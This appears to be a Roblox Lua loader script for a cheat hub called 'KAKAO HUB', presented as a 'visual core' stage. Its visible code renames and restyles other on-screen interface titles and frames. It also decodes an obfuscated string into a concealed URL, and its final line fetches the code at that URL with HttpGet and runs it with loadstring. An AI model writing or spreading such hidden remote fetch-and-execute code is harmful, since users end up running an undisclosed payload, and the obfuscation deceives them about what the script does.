
--[[ STAGE 2: VISUAL CORE ]]
local FtdQTdWlPdb24Ce8CrhfY="\128\160\164\164\165\098\089\093\182\171\193\110\185\179\212\188\219\202\227\225\219\234\221\221\226\000\243\238\012\182\253\253\003\197\030\011\017\048\046\035\056\048\041\239\069\076\067\065\001\019\024\028\043\047\025\114\107\110\125\045\112\127\127\136\149\069\139\147\143\150\089\157\166\174\195\193\181\187\212\199\204\134\204\231\215\150\244\236\252"local u3P9a2SHkuVWjrRF=139 local HED8TSqs53Rrr=144 local Ei2OgdB3CMOhQYh9kT1M=0 local TZv6WEAYI8cG0e_wVL=4 local Y3y8psjI5VLwI9uvlV=9 local un29eSjODuUwIf0q1xuoX=false local x744s18RyRQ1xZFs6CDX=bit32 and bit32.bxor if not x744s18RyRQ1xZFs6CDX then x744s18RyRQ1xZFs6CDX=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local l_udv6G38uIc36Rga={}for WTeSErG2xa0l7e5i=1,#FtdQTdWlPdb24Ce8CrhfY do local UMQ0JAsTS3YJnRQY7ZbMCI=string.byte(FtdQTdWlPdb24Ce8CrhfY,WTeSErG2xa0l7e5i)local Ufom4zHrshW5oR39=(HED8TSqs53Rrr+(WTeSErG2xa0l7e5i*TZv6WEAYI8cG0e_wVL)+Y3y8psjI5VLwI9uvlV)%256 if Ei2OgdB3CMOhQYh9kT1M==0 then UMQ0JAsTS3YJnRQY7ZbMCI=(UMQ0JAsTS3YJnRQY7ZbMCI-Ufom4zHrshW5oR39)%256 l_udv6G38uIc36Rga[WTeSErG2xa0l7e5i]=string.char(x744s18RyRQ1xZFs6CDX(UMQ0JAsTS3YJnRQY7ZbMCI,u3P9a2SHkuVWjrRF))else UMQ0JAsTS3YJnRQY7ZbMCI=x744s18RyRQ1xZFs6CDX(UMQ0JAsTS3YJnRQY7ZbMCI,u3P9a2SHkuVWjrRF)l_udv6G38uIc36Rga[WTeSErG2xa0l7e5i]=string.char((UMQ0JAsTS3YJnRQY7ZbMCI-Ufom4zHrshW5oR39)%256)end end local qrMgG7Zx0LFW=table.concat(l_udv6G38uIc36Rga)if un29eSjODuUwIf0q1xuoX then qrMgG7Zx0LFW=string.reverse(qrMgG7Zx0LFW)end local mZgBljc3ihBxSQrZDRS=qrMgG7Zx0LFW
local HubName = "KAKAO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(mZgBljc3ihBxSQrZDRS))()
